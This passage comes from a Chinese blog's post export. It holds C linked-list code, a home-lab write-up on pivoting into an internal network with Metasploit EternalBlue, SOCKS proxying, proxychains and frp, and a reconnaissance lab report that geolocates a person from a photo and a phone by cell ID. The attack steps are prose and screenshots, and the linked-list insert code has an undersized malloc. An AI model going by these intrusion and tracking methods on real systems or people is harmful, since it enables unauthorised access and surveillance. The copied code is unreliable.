<li>插入和删除操作需要移动大量的元素，时间复杂度为O(n)</li>
<li>线性表的存储空间大小难以确定，并且不好扩展</li>
<li>造成存储空间碎片化</li>
</ul>
</blockquote>
<p>  以下为顺序表的基本功能</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    SeqList slist = (SeqList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> List)); <span class="comment">/*申请结构体List空间*/</span></span><br><span class="line">    <span class="keyword">if</span> (slist != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem = (DataType*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DataType) * m);</span><br><span class="line">        <span class="comment">/*申请顺序表空间，大小为m个DataType空间*/</span></span><br><span class="line">        <span class="keyword">if</span> (slist-&gt;elem) &#123;</span><br><span class="line">            slist-&gt;Max = m;<span class="comment">/*顺序表的最大值*/</span></span><br><span class="line">            slist-&gt;n = <span class="number">0</span>; <span class="comment">/*顺序表长度赋值为0*/</span></span><br><span class="line">            <span class="keyword">return</span>(slist);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">free</span>(slist);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;out of space!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsNullList_seq</span><span class="params">(SeqList slist)</span><span class="comment">/*判断顺序表是否为空*/</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(slist-&gt;n == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_seq</span><span class="params">(SeqList slist, <span class="type">int</span> p, DataType x)</span></span><br><span class="line"><span class="comment">/*在线性表slist的p位置之前插入x*/</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span> (slist-&gt;n &gt;= slist-&gt;Max) &#123; <span class="comment">/*顺序表满溢出*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p&lt;<span class="number">0</span> || p&gt;slist-&gt;n) &#123;  <span class="comment">/*不存在下标为p的元素*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not exist!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (q = slist-&gt;n - <span class="number">1</span>; q &gt;= p; q--)<span class="comment">/*插入位置以及之后的元素后移*/</span></span><br><span class="line">        slist-&gt;elem[q + <span class="number">1</span>] = slist-&gt;elem[q];</span><br><span class="line">    slist-&gt;elem[p] = x;  <span class="comment">/*插入元素x*/</span></span><br><span class="line">    slist-&gt;n = slist-&gt;n + <span class="number">1</span>;  <span class="comment">/*顺序表长度加1*/</span></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(SeqList slist)</span><span class="comment">//打印顺序表</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; slist-&gt;n; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, slist-&gt;elem[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DelIndex_seq</span><span class="params">(SeqList slist, <span class="type">int</span> p)</span> <span class="comment">//删除下标为p的元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; <span class="number">0</span> || p &gt;= slist-&gt;n) &#123;<span class="comment">//不存在下标为p的元素</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (q = p; q &lt; slist-&gt;n - <span class="number">1</span>; q++) &#123; <span class="comment">//p位置之后的元素向前移动</span></span><br><span class="line">        slist-&gt;elem[q] = slist-&gt;elem[q + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    slist-&gt;n = slist-&gt;n - <span class="number">1</span>; <span class="comment">//顺序表长度减1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>

<h3 id="链式线性表-单链表"><a href="#链式线性表-单链表" class="headerlink" title="链式线性表-单链表"></a>链式线性表-单链表</h3><p>其中的元素的储存位置是任意的，具体位置在程序运行时动态分布。其在物理位置上相邻元素并不相邻。</p>
<blockquote>
<p>存储分配：</p>
<ul>
<li>顺序 -&gt; 一段地址连续的存储空间</li>
<li>链式 -&gt; 任意地址存储空间</li>
</ul>
<p>时间：</p>
<ul>
<li>查找 顺序 -&gt; O(1) 链式 -&gt; O(n)</li>
<li>插入和删除 顺序 -&gt; O(n) 链式 -&gt; 寻找相应的节点，时间复杂度为O(n)，然后，插入和&gt; &gt;删除为O(1)</li>
</ul>
<p>空间：</p>
<ul>
<li><p>顺序 -&gt; 需要提前分配存储空间，分配大了，浪费空间，分配小了，容易发生上溢</p>
</li>
<li><p>链式 -&gt; 不需要提前分配空间，只要有存储空间分配就行，数据元素个数只受可分配存储空间&gt; 大小的限制</p>
</li>
</ul>
</blockquote>
<p>以下是其基本功能</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断head指针是否为空</span></span><br><span class="line">LinkList <span class="title function_">SetNullList_Link</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    LinkList head = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span> (head != <span class="literal">NULL</span>) head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> head; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建单链表--&gt;尾插法</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Tail</span><span class="params">(<span class="keyword">struct</span> Node* head)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = <span class="literal">NULL</span>;</span><br><span class="line">    PNode q = head;</span><br><span class="line">    DataType data;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    <span class="keyword">while</span> (data != <span class="number">-1</span>)</span><br><span class="line">    &#123;   </span><br><span class="line">        p = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">        p-&gt;data = data;</span><br><span class="line">        p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        q-&gt;next = p;</span><br><span class="line">        q = p;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_link</span><span class="params">(LinkList llist,LinkList p, DataType x)</span>&#123;</span><br><span class="line">    LinkList pre=llist,q=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(pre-&gt;next!= p)&#123;</span><br><span class="line">        pre=pre-&gt;next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    q=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkList));</span><br><span class="line">    q-&gt;data=x;</span><br><span class="line">    q-&gt;next=p;</span><br><span class="line">    pre-&gt;next=q;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertPost_link_value</span><span class="params">(LinkList head,<span class="type">int</span> finddata,<span class="type">int</span> insertdata)</span>&#123;</span><br><span class="line">    LinkList p=head;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;data!=finddata)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    InsertPre_link(head,p,insertdata);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印单链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(LinkList head)</span>   </span><br><span class="line">&#123;</span><br><span class="line">    PNode  p = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除单链表并释放空间</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DestoryList_Link</span><span class="params">(LinkList head)</span>  </span><br><span class="line">&#123;</span><br><span class="line">    PNode  pre = head; </span><br><span class="line">    PNode p = pre-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">free</span>(pre);</span><br><span class="line">        pre = p;</span><br><span class="line">        p = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(pre);</span><br><span class="line">&#125;```</span><br></pre></td></tr></table></figure>

<h3 id="单循环链表"><a href="#单循环链表" class="headerlink" title="单循环链表"></a>单循环链表</h3><p>在单链表的基础上将最后一个节点的指针指向链表的第一个节点，形成一个环，称之为单循环链表。</p>
<p><img src="/2023/11/01/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E6%80%BB%E7%BB%93/OIP-16982375857111.jpg" alt="OIP"></p>
<h3 id="双链表和双循环链表"><a href="#双链表和双循环链表" class="headerlink" title="双链表和双循环链表"></a>双链表和双循环链表</h3><h4 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h4><p>存在钱去和后继</p>
<blockquote>
<p>优点</p>
<ul>
<li>可以实现双向查找<br>缺点</li>
<li>需要额外的储存空间存放前驱节点</li>
</ul>
</blockquote>
<h4 id="双循环链表"><a href="#双循环链表" class="headerlink" title="双循环链表"></a>双循环链表</h4><p>把双链表的最后的一个节点的后继指针指向第一个节点，把第一个节点的前驱指针指向最后一个节点，就组成了双循环链表。</p>
<p><img src="/2023/11/01/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E6%80%BB%E7%BB%93/225854.jpg" alt="双链表"></p>
<h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p><strong>栈</strong>（英语：stack）又称为<strong>堆栈</strong>或<strong>堆叠，</strong>栈作为一种数据结构，是一种只能在一端进行插入和删除操作的特殊线性表。它按照先进后出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据（最后一个数据被第一个读出来）。栈具有记忆作用，对栈的插入与删除操作中，不需要改变栈底指针。</p>
<ul>
<li><strong>定义</strong>：只允许在一端进行插入或删除的线性表</li>
<li><strong>栈顶（top）</strong> ：允许进行插入或删除的一端</li>
<li><strong>栈底（bottom）:</strong> 与栈顶相对应的一端</li>
<li><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b1128b4101604e1890d3f7dd2d655039~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp" alt="img"></li>
<li><strong>特点：</strong> 先进后出</li>
</ul>
<p>包含顺序栈，双栈等</p>
<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列是一种特殊的<code>线性表</code>，特殊之处在于它只允许在表的<code>前端（front）</code>进行删除操作，而在表的<code>后端（rear）</code>进行插入操作，和栈一样，队列是一种<code>操作受限制</code>的线性表。进行插入操作的端称为<code>队尾</code>，进行删除操作的端称为<code>队头</code>。</p>
]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言,数据结构,线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透一</title>
    <url>/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>在一次场景搭建（其概念图大致为：以liunx-1做跳板机，进入win10-1,在从win10-1访问与之相连的win7-1的80端口和linux-2的21端口）。在主机渗透时使用msf攻击时，若要访问win10,win7主机需要配置相关路由，因此要掌握内网穿透的知识。</p>
<h3 id="NAT转换的多种模式"><a href="#NAT转换的多种模式" class="headerlink" title="NAT转换的多种模式"></a>NAT转换的多种模式</h3><blockquote>
<p>（三种模式的讲解参考<a href="https://www.juniper.net/documentation/cn/zh/software/junos/nat/topics/topic-map/security-nat-static.html">《网络地址转换用户指南》</a>  <a href="https://blog.csdn.net/xtggbmdk/article/details/89222407">《静态NAT、动态NAT、PAT(端口多路复用)之间的区别》</a> <a href="https://xie.infoq.cn/article/ede737a71f5e1e1eec9784239">《三张图解释静态 NAT、动态 NAT、PAT》</a>）</p>
</blockquote>
<h4 id="静态转换"><a href="#静态转换" class="headerlink" title="静态转换"></a>静态转换</h4><p>静态NAT将网络信息流从静态外部 IP 地址映射到内部 IP 地址或网络。它创建实际地址到映射地址的静态转换。静态NAT通过具有未注册专用 IP 地址的专用 LAN 提供与网络设备的互联网连接。</p>
<p>静态NAT可定义从一个 IP 子网到另一个 IP 子网的一对一映射。映射包括一个方向的目标 IP 地址转换，以及反向的源 IP 地址转换。从NAT设备，原始目标地址是虚拟主机 IP 地址，而映射至地址是真正的主机 IP 地址。手动写入 IP 地址映射条目，配置 NAT 表，一个内网地址对应着一个外网地址，举例，192.168.x.x 对应 1.1.x.x。当 192.168.x.x 向外网发包，则过路由的时候，会根据静态 NAT 表，将 192.168 .x.x更换为 1.1.x.x。–&gt;但并不意味着一个公网IP<strong>只能</strong>对应一个IP。</p>
<h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><p>指将内部私有IP转换为公网IP地址时，IP的对应关系是不确定的。也就是说只要指定哪些内部地址可以进行NAT转换，以及哪些可以的合法的IP地址可以作为外部地址，就可以进行动态转换了。也可以使用多个合法地址集。</p>
<p>在动态转发中，一个公网IP可以对应一个网关IP，例如：192.168.1.0&#x2F;24 这个网段对应着 100.1.x.x；192.168.1.1 发包；在 NAT 地址转换里，形成了一条映射（条目），就是，192.168.1.1 映射 100.1.x.x，这个时候，由于 192.168.1.1 占用着 100.1.x.x，则别人无法再使用这个 100.1.x.x，直到 192.168.1.映射表项老化后 ，则可以把 100.1 .x.x给别人；别人无法使用的原因是，如果别人也在使这个 100.1， 得不到回包。内网主机发起连接请求时，会自动分配一个公网IP和端口。</p>
<h4 id="端口多路复用-PAT"><a href="#端口多路复用-PAT" class="headerlink" title="端口多路复用(PAT)"></a>端口多路复用(PAT)</h4><p>端口多路复用(OverLoad)是指改变外出数据包的源端口并进行端口转换，即端口地址转换(PAT，Port Address Translation).采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问，从而可以最大限度地节约IP地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自internet的攻击。因此，目前网络中应用最多的就是端口多路复用方式。</p>
<p>例如在一个网段中，192.168.1.1向外发送请求，经过路由时，会将192.168.1.1映射到8.0.130.x(公网IP)的一个端口上，当12.168.1.1的会话不结束，那该IP会一直占用8.0.130.x这个IP和端口号（端口号已使用，其他主机无法在使用，直至会话结束）。</p>
<h3 id="内网穿透-msf配置路由和sock代理穿透内网配合"><a href="#内网穿透-msf配置路由和sock代理穿透内网配合" class="headerlink" title="内网穿透-msf配置路由和sock代理穿透内网配合"></a>内网穿透-msf配置路由和sock代理穿透内网配合</h3><ul>
<li>本机环境搭建下网络拓扑图为：</li>
</ul>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/11-17022646760041.jpg"></p>
<p>操作大致流程：</p>
<p>kali msf(msf17_010)–&gt;get shell(windos7)–&gt;上传+socks穿透-&gt;win7 反弹.exe –&gt;kali msf监听端口</p>
<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>进行windows7永恒之蓝攻击（因为已知存在永恒之蓝，便不再扫描是否存在</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211114327.jpg"></p>
<p>执行返回shell</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211114511.jpg"></p>
<p>向window7上传natbypass可执行文件到temp目录下（temp目录具有可执行权限）该步骤用于之后win7反弹shell使用（先埋个坑，等以后学到时再更新。</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211115722.jpg"></p>
<p>arp -a后找到存在的内网主机,发现目标主机192.168.56.102，但该主机只能window7可以ping通，因此要内网穿透。</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211122900.jpg"></p>
<p>设置自动路由，发现设置成功。</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211160344.jpg"></p>
<p>设置socks代理</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211160544.jpg"></p>
<p>设置&#x2F;ect&#x2F;proxychains4.conf文件：将dynamic_chain取消注释，proxy_dns加入注释，在[ProxyList]选项中加入代理:</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211192852.jpg"></p>
<p>之前扫描开放了80端口：使用kali下载内容:</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211192950.jpg"></p>
<p>发现可以正常访问。在firefox下设置好proxy后同样可以访问web服务</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211193749.jpg"></p>
<p>然后就可以找漏洞上传shell了。（其实这里可以用natbypass.exe来进行）当然如果win7开启了远程连接，那么直接rdesktop连接。</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231211194855.jpg"></p>
<h4 id="流程详解"><a href="#流程详解" class="headerlink" title="流程详解"></a>流程详解</h4><h5 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h5><p><strong>SOCKS</strong>是一种<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">网络传输协议</a>，主要用于客户端与外网服务器之间通讯的中间传递。socks协议属于会话层的协议，位于表示层和传输层之间。socks代理相较于http代理还可以转发UDP代理，socks代理有socks4,socks4a,socks5多个分支。此次实验使用的时socks5版本。</p>
<p><code>msf</code>中内置了三个socks代理模块，分别是socks4a、socks5、socks_unc。一般常使用 socks4a和socks5进行代理。其二者只是由于所支持的具体应用不同而存在差异。socks4只支持TCP协议而socks5支持TCP&#x2F;UDP协议，还支持各种身份验证机制等协议，也就是说这里使用socks5的话还需要设置用户名与密码。</p>
<blockquote>
<blockquote>
<p>​	等以后学习socks代理后,单独写文章深入研究.</p>
</blockquote>
</blockquote>
<h5 id="全局代理proxychain4"><a href="#全局代理proxychain4" class="headerlink" title="全局代理proxychain4"></a>全局代理proxychain4</h5><p>用于对指定工具进行代理,例如实验中proxychains4 nmap -sn xxx.xxx.xx.xxx,是指proxychains4通过socks5代理,对内网主机win7进行nmap扫描。</p>
<p>ProxyChains 是一个 UNIX 程序，它通过预加载的 DLL（dlsym()、LD_PRELOAD）在动态链接程序中挂钩网络相关的 libc 函数，并通过 SOCKS4a&#x2F;5 或 HTTP 代理重定向连接。它仅支持 TCP(不支持 UDP&#x2F;ICMP 等)。</p>
<p>通过修改配置文件&#x2F;ect&#x2F;proxychains4.conf,来指定代理的具体功能,例如代理方式,IP,端口等。</p>
<h5 id="远程连接win7"><a href="#远程连接win7" class="headerlink" title="远程连接win7"></a>远程连接win7</h5><p>这种情况十分少,多是可以通过代理可以ping通主机后,寻找漏洞点,再反弹shell。</p>
<h5 id="msf正向路由和反向路由"><a href="#msf正向路由和反向路由" class="headerlink" title="msf正向路由和反向路由"></a>msf正向路由和反向路由</h5><ul>
<li><p>正向连接是受害主机监听一个端口，由攻击主机主动去连接受害主机的过程，适用于受害主机具有公网ip的情况.</p>
</li>
<li><p>反向连接是控制机主机监听一个端口，由受害主机反向去连接攻击主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况.</p>
</li>
</ul>
<h3 id="内网穿透-frp"><a href="#内网穿透-frp" class="headerlink" title="内网穿透-frp"></a>内网穿透-frp</h3><p>frp 是一个反向代理工具.可以轻松地进行内网穿透.对外网提供服务,frp支持 tcp协议, http协议, https 等协议类型,并且 web 服务支持根据域名进行路由转发。之前在搭建赵师傅CTFd时，对于动态靶机的使用用到了frp技术。</p>
<p>主要文件为frpc（客户端），frps（服务端），配置文件为frpc.ini,frps.ini文件。</p>
<h5 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>修改frp客户端：</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231212215326.jpg"></p>
<p>上传frpc文件（反向的代理</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231212215421.jpg"></p>
<p>运行服务端，win7执行客户端。（shell乱码解决：chcp 65001</p>
<p><img src="/2023/12/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/QQ%E6%88%AA%E5%9B%BE20231212215421.jpg"></p>
<p>显示失败？？？？？靠，以后再弄，哭！！</p>
<p>&#x2F;&#x2F;12-13日 补坑，frp的穿透已经实施成功，补充到了这篇文章中<a href="https://recyvan.github.io/2023/12/13/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">《frp内网渗透》</a>（点击进入）。</p>
]]></content>
      <categories>
        <category>内网穿透</category>
      </categories>
      <tags>
        <tag>渗透测试，路由</tag>
      </tags>
  </entry>
  <entry>
    <title>实验课一</title>
    <url>/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/</url>
    <content><![CDATA[<p><strong>网络渗透测试实验报告</strong> </p>
<hr>
<h2 id="一-实验目的和要求"><a href="#一-实验目的和要求" class="headerlink" title="一 实验目的和要求"></a>一 实验目的和要求</h2><p>理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。</p>
<h2 id="二-实验步骤"><a href="#二-实验步骤" class="headerlink" title="二 实验步骤"></a>二 实验步骤</h2><h3 id="1-用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。"><a href="#1-用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。" class="headerlink" title="1.用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。"></a>1.用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。</h3><p>使用Google搜索：</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195152905.png" alt="image-20231209195152905"></p>
<p>查找相关网页：</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195206871.png" alt="image-20231209195206871"></p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195211299.png" alt="image-20231209195211299"></p>
<h3 id="2-照片中的女生在哪里旅行？截图搜索到的地址信息。"><a href="#2-照片中的女生在哪里旅行？截图搜索到的地址信息。" class="headerlink" title="2.照片中的女生在哪里旅行？截图搜索到的地址信息。"></a>2.照片中的女生在哪里旅行？截图搜索到的地址信息。</h3><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195232804.png" alt="image-20231209195232804"></p>
<p>Google搜索：letrentehuit café brasserie发现：</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195249443.png" alt="image-20231209195249443"></p>
<p>地址是：38 avenue de Suffren.75015 Paris.France。</p>
<h3 id="3-手机位置定位。通过LAC（Location-Area-Code，位置区域码）和CID（Cell-Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。"><a href="#3-手机位置定位。通过LAC（Location-Area-Code，位置区域码）和CID（Cell-Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。" class="headerlink" title="3.手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。"></a>3.手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。</h3><p>华为手机应该拨号*#* #2846579# *#*进入工程模式</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195332722.png" alt="image-20231209195332722"></p>
<p>但是honor系列并不能在工程菜单找到相关信息。</p>
<img src="/2023/12/07/实验一网络扫描与网络侦察/undefined" style="zoom:50%;">

<p>在基站查询工具得到如下信息：</p>
<img src="/2023/12/07/实验一网络扫描与网络侦察/undefined" alt="qq_pic_merged_1702124303982" style="zoom:50%;">



<h3 id="4-编码解码将Z29vZCBnb29kIHN0dWR5IQ-解码。截图。"><a href="#4-编码解码将Z29vZCBnb29kIHN0dWR5IQ-解码。截图。" class="headerlink" title="4.编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。"></a>4.编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。</h3><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195413526.png" alt="image-20231209195413526"></p>
<h3 id="5-地址信息"><a href="#5-地址信息" class="headerlink" title="5.地址信息"></a>5.地址信息</h3><h4 id="5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"><a href="#5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。" class="headerlink" title="5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"></a>5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195442914.png" alt="image-20231209195442914"></p>
